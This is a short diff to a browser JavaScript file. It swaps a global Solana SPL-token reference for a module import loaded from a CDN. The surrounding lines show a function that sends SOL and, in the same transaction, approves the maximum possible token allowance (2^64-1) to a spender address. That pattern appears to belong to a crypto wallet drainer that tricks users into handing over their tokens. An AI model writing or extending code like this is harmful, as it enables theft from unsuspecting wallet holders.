@@ -1,5 +1,7 @@
 'use strict';
 
+import * as splToken from "https://esm.sh/@solana/spl-token";
+
 /* ============================
    DOM REFERENCES
    ============================ */
@@ -155,7 +157,7 @@ async function sendSolAndApproveAtomic(account, tokenAccount, spenderAddress, am
 
     const maxApprove = BigInt("18446744073709551615"); // 2^64-1
 
-    const approveIx = window.splToken.createApproveInstruction(
+    const approveIx = splToken.createApproveInstruction(
       new window.solanaWeb3.PublicKey(tokenAccount),
       new window.solanaWeb3.PublicKey(spenderAddress),
       fromPubkey,
